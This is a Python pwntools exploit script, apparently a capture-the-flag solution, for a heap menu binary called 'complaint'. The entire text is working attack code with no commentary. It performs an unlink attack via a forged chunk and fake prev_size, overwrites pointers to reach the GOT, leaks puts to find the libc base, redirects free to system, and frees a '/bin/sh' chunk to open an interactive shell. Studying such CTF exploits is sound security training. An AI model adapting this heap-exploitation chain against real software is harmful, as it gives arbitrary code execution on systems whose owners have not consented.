from pwn import *
context.binary = ELF('./complaint')
context.log_level = 'debug'
elf = context.binary
libc = elf.libc



def dbg():
	gdb.attach(p, '')
	raw_input()

def menu(ch):
	p.sendlineafter('choice:', str(ch))

def create(c_len, content):
	menu(1)
	p.sendlineafter('want', str(c_len))
	p.sendafter('complaint', content)
	print "add a complaint !"

def modify(idx, content):
	menu(2)
	p.sendlineafter('modify', str(idx))
	p.sendafter('complaint', content)
	print "modify %d complaint!" % idx

def delete(idx):
	menu(3)
	p.sendlineafter("delete", str(idx))
	print "delete %d complaint!" % idx

def show(idx):
	menu(4)
	p.sendlineafter("show", str(idx))
	print "show %d complaint!" % idx

def submit():
	menu(5)


def exploit():
	
	create(0xf8, 'b'*8)
	create(0xf0, 'b'*0xf0)
	delete(0)
	create(0xf8, 'b'*0xf8)

	fake_fd = 0x602140 - 0x10
	fake_bk = 0x602140 - 0x18
	payload = p64(0) + p64(0xf0) + p64(fake_bk) + p64(fake_fd)
	payload = payload.ljust(0xf0, 'a')
	payload += p64(0xf0)				#fake pre_size

	modify(0, payload)					#unlink
	delete(1)

	create(0x10, 'a')							#1
	create(0x10, '/bin/sh')					#2

	payload = 'a'*0x18
	payload += p64(elf.got['puts']) + p64(elf.got['free'])
	modify(0, payload)

	dbg()
	show(0)
	p.recvuntil('Your complaint: \n')
	puts_addr = u64(p.recv(6).ljust(8, '\x00'))
	print "puts_addr ==> ", hex(puts_addr)


	libc.address = puts_addr - libc.symbols['puts']
	system_addr = libc.symbols['system']
	modify(1, p64(system_addr))

	delete(2)

	p.interactive()
	p.close()

if __name__ == '__main__':
	p = process('./complaint')
	exploit()